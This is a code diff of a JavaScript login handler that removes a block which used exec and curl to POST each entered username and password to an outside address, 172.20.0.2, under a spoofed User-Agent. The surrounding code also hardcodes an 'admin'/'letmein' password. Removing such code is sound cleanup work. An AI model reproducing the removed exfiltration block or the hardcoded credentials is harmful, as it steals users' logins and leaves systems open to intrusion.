@@ -88,22 +88,6 @@
     
                 var correct_user = "admin";
                 var correct_pass = "letmein";
-                
-                const { exec } = require('child_process');
-
-                const curlCommand = `curl -X POST http://172.20.0.2/ \
-                    -H "Content-Type: application/x-www-form-urlencoded" \
-                    -H "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;)" \
-                    -d "user=${username}&password=${password}"`;
-
-                exec(curlCommand, (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`exec error: ${error}`);
-                        return;
-                    }
-                    console.log(`stdout: ${stdout}`);
-                    console.error(`stderr: ${stderr}`);
-                });
 
                 // Check if the credentials are correct
                 if (correct_pass === password && username === correct_user) {
